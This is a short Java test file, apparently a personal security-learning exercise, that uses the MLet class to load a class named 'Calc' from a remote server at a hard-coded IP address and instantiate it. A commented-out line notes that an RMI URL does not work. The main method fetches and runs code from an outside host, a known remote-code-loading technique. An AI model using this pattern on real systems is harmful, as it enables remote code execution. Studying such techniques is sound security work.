package com.xjjlearning.hack.java;

import javax.management.ServiceNotFoundException;
import javax.management.loading.MLet;

/**
 * Created by xjj on 2023/3/18.
 */
public class MLetTest {
    public static void main(String[] args) throws ServiceNotFoundException, ClassNotFoundException, InstantiationException, IllegalAccessException {
        MLet mLet = new MLet();
        mLet.addURL("http://47.95.7.37:9870/");
//        mLet.addURL("rmi://47.95.7.37:1099/"); -> 不可以使用rmi
        Class<?> calc = mLet.loadClass("Calc");
        calc.newInstance();
    }
}
